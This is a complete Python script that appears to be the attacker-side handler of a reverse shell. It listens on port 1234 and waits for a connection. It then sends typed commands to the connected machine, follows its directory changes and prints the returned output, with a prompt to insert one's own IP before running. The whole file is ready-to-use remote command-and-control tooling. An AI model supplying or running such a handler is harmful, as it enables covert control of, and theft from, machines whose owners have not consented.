import socket
import os
import time
from termcolor import colored
import sys

socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

ip = "[YOUR PRIVATE / LOCAL IP ADDRESS]"

if ip == "[YOUR PRIVATE / LOCAL IP ADDRESS]":
    print(colored("YOU MUST CHANGE THE IP IN THE CODE BEFORE RUNNING THE SCRIPT","red"))
    sys.exit()

else:
    pass

try:
    socket.bind((ip,1234))
except:
    print(colored("ADDRESS ALREADY BEING USED - WAIT A MINUTE AND TRY AGAIN","red"))
    sys.exit()






socket.listen(5)

client , address = socket.accept()

IP = address[0]
port = address[1]

print(colored(f"CONNECTED TO {IP} ON PORT {port}","yellow"))
print("")

print(colored("Enter q to disconnect","yellow"))



cwd = client.recv(1024).decode().strip()


while True:
    changingdirs = 0
    command = str(input(colored(f"{cwd} >>> ","green")))

    if command[0:2] == "cd":
        changingdirs = 1
        




    if command.lower() == "q":
        break

    elif command == "":
        print(colored("INVALID COMMAND","red"))

    else:


        command = command.encode()

        client.send(command)


        output = client.recv(1024).decode()

        if changingdirs == 1 and output != "INVALID COMMAND" :
            cwd = output.strip()
                
        else:

            if output == "INVALID COMMAND":
                print(colored("INVALID COMMAND","red"))

            elif output == "NOUTPUT":
                pass

            else:

                print("")

                print(output)
                print("")

client.close()
socket.close()







